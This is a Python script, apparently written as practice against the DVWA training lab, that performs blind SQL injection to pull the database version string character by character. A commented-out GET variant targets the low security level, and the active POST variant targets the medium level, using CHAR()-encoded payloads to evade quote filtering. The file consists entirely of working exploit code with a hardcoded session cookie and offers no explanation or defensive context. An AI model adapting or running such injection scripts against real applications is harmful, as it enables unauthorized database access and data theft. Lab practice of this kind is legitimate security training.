#! /usr/bin/python3

import requests
import sys

charlist = [chr(i) for i in range(33,127)]

URL = "http://192.168.0.105/dvwa/vulnerabilities/sqli_blind/"

PASSEDTEXT = "User ID exists in the database."


FOUND, VERSION, STRAIGHT = False, "", True

##### GET REQUEST
# COOKIES = {'security': 'low', 'PHPSESSID': 's6v1p8jf7eofj92eamqmhpavst'}
# while not FOUND:
#     if STRAIGHT:
#         for char in charlist:
#             print(f"\r[*] Trying {char}", end="")
#             response = requests.get(URL, params={'id':"1' AND LOCATE('" + VERSION + char + "',@@VERSION);-- -", "Submit":"Submit"}, cookies=COOKIES)
            
#             if PASSEDTEXT in response.text:
#                 print(f"[+] WORKED FOR {char}... Version guess: {VERSION}")
#                 VERSION = VERSION + char
#                 break
#         else:
#             STRAIGHT = False
#     else:
#         for char in charlist:
#             print(f"\r[*] Trying {char}", end="")
#             response = requests.get(URL, params={'id':"1' AND LOCATE('" + char + VERSION + "',@@VERSION);-- -", "Submit":"Submit"}, cookies=COOKIES)
            
#             if PASSEDTEXT in response.text:
#                 print(f"[+] WORKED FOR {char}... Version guess: {VERSION}")
#                 VERSION = char + VERSION 
#                 break
#         else:
#             response = requests.get(URL, params={'id':"1' AND '"+VERSION+"'=@@VERSION;-- -", "Submit":"Submit"}, cookies=COOKIES)
#             if PASSEDTEXT in response.text:
#                 print(f"VERSION Found: {VERSION}")
#                 sys.exit()
            
#####
    
##### POST REQUEST
COOKIES = {'security': 'medium', 'PHPSESSID': 's6v1p8jf7eofj92eamqmhpavst'}
while not FOUND:
    if STRAIGHT:
        for char in charlist:
            print(f"\r[*] Trying {char} and {str(ord(char))}", end="")
            payload = "1 AND LOCATE(CONCAT(" + ','.join(["CHAR("+str(ord(el))+")" for el in (VERSION + char) ]) + "),@@VERSION);-- -"
            response = requests.post(URL, data={'id':payload ,"Submit":"Submit"}, cookies=COOKIES)
            if PASSEDTEXT in response.text:
                print(f"[+] WORKED FOR {char}... Version guess: {VERSION}")
                VERSION = VERSION + char
                break
        else:
            STRAIGHT = False
    else:
        for char in charlist:
            print(f"\r[*] Trying {char} and {str(ord(char))}", end="")
            payload = "1 AND LOCATE(CONCAT(" + ','.join(["CHAR("+str(ord(el))+")" for el in (char + VERSION) ]) + "),@@VERSION);-- -"
            response = requests.post(URL, data={'id':payload, "Submit":"Submit"}, cookies=COOKIES)
            
            if PASSEDTEXT in response.text:
                print(f"[+] WORKED FOR {char}... Version guess: {VERSION}")
                VERSION = char + VERSION 
                break
        else:
            response = requests.post(URL, data={'id':"1 AND CONCAT("+','.join(["CHAR("+str(ord(el))+")" for el in (VERSION) ])+")=@@VERSION;-- -", "Submit":"Submit"}, cookies=COOKIES)
            if PASSEDTEXT in response.text:
                print(f"VERSION Found: {VERSION}")
                sys.exit()
            
#####
    

